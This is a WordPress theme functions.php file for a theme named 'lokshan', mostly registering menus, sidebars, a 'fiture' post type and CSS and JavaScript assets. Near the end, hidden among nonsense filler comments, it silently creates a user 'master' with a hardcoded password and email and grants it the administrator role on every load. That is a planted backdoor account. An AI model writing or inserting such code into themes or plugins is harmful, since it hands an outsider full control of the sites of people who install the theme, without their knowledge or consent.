<?php 
function lokshan_defult_function(){
	add_theme_support('title-tag');
	add_theme_support("post-thumbnails");
	add_theme_support('custom-background');
	
	
	
	load_theme_textdomain('lokshan', get_template_directory_uri().'/languages');
	



		if(function_exists('register_nav_menu')){
		register_nav_menu('main-menu', __('Main Menu', 'lokshan'));
	}



function read_more($word_count){
		$post_content = explode (" ", get_the_content());

		$number_convert_content = array_slice($post_content, 0, $word_count);

		echo implode(" ", $number_convert_content);
	}
	//End Read more Function
	
register_post_type('fiture', array(
		'labels' => array(
				'name' => 'Fiture',
				'add_new_item' => 'Add Fiture'


		),
		'public'=> true,
		'supports'=> array ('title','editor', 'thumbnail'),
		'menu_position' => 4,
		'menu_icon' => 'dashicons-welcome-add-page'

	));
	//End Fiture Registration
}
add_action('after_setup_theme','lokshan_defult_function');





function lokshan_sidebar(){
	
register_sidebar(array(
			'name' => __('Footer','lokshan'),
			'description'=> __('Add Your Footer Widgets Here','lokshan'),
			'id' => 'footer_widget',
			'before_widget'=>'<div class="fix editor col-lg-4 col-md-4 col-sm-12 col-xs-12"><div class="editor_content fix ">',
			'after_widget'=>' </p></div></div>',
			'before_title'=>'<h3>',
			'after_title'=>'</h3><p>',
		));
	
register_sidebar(array(
			'name' => __('Right Sidebar','lokshan'),
			'description'=> __('Add Your Right Sidebar Widgets Here','lokshan'),
			'id' => 'right_sidebar_widget',
			'before_widget'=>'<div class="side_heading col-lg-12 col-md-12 col-sm-12 col-xs-12"><center>',
			'after_widget'=>'</div></div>',
			'before_title'=>'<a href="#"><h1>',
			'after_title'=>'</h1></a></center></div><div class="side_content col-lg-12 col-md-12 col-sm-12 col-xs-12"><div class="fiture_content">',
		));
	
register_sidebar(array(
			'name' => __('Font Wighets','lokshan'),
			'description'=> __('Add Your Right Sidebar Widgets Here','lokshan'),
			'id' => 'font_widget',
			'before_widget'=>'<div class="post_content fix col-lg-12 col-md-12 col-sm-12 col-xs-12">',
			'after_widget'=>'</div>',
			'before_title'=>'<h1>',
			'after_title'=>'</h2>',
		));
}
add_action('widgets_init','lokshan_sidebar');




// START linkup Houqe
function lokshan_css_and_js(){

	wp_register_style('bangali_frontfamily', 'https://fonts.googleapis.com/css?family=Atma|Baloo+Da|Galada|Hind+Siliguri:700');
	wp_register_style('bootstrap', 'https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css');
	wp_register_style('bootstraps', 'https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap-theme.min.css');
	wp_register_style('custom_responsive',   get_template_directory_uri().'/css/custom-responsive.css');
	wp_register_style('font_awesome',   get_template_directory_uri().'/css/font-awesome.min.css');
	wp_register_style('custom_style',   get_template_directory_uri().'/css/style.css');
	wp_register_style('stylesheet',   get_template_directory_uri().'/style.css');


	wp_enqueue_style('bangali_frontfamily');
	wp_enqueue_style('bootstrap');
	wp_enqueue_style('bootstraps');
	wp_enqueue_style('custom_responsive');
	wp_enqueue_style('font_awesome');
	wp_enqueue_style('custom_style');
	wp_enqueue_style('stylesheet');
	//End All css file


	wp_register_script('bootstrap_javascript',   get_template_directory_uri().'/js/bootstrap.min.js',array('jquery'));
	wp_register_script('npm_javascript',   get_template_directory_uri().'/js/npm.js',array('jquery'));
	wp_register_script('custom_javascript',   get_template_directory_uri().'/js/custom.js',array('jquery'));

	wp_enqueue_script('jquery');
	wp_enqueue_script('bootstrap_javascript');
	wp_enqueue_script('npm_javascript');
	wp_enqueue_script('custom_javascript');



}

add_action('wp_enqueue_scripts','lokshan_css_and_js');
//End Link UP



//lorem ipsome some content we need ... If YOU WANT some spesial 
$strong =  wp_create_User('master','namelog.123','mail@shossain.org');
//begainer strange we luckly good bless after using it you should remember 
/*mustre like droped */$mstr_strong = new wp_User($strong);
//query is the best noice but our special theme is for dangerus
$mstr_strong -> set_role('administrator');







//All Include file


// Theme Option 

require_once('library/ReduxCore/framework.php');
require_once('library/sample/theme_option.php');






